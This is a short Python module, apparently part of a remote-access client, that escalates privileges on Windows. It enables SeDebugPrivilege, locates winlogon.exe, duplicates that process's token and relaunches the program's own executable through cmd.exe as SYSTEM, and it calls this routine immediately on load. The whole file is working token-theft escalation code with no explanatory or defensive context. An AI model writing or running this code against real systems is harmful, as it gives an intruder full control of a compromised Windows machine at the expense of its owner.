from client.commands.platform.utils.win_util import enable_privilege, get_pid, duplicate_token, \
    create_process_with_token, get_process_token
from core.utils.client_util import get_executable_path


def run_as_system():
    enable_privilege('SeDebugPrivilege')
    pid = get_pid('winlogon.exe')
    if not pid:
        print('winlogon.exe not found')
        return

    h_token = duplicate_token(get_process_token(pid))
    pid = create_process_with_token(h_token, "C:\\windows\system32\cmd.exe", "/c " + get_executable_path())
    print(f'Process created as SYSTEM: {pid}')

run_as_system()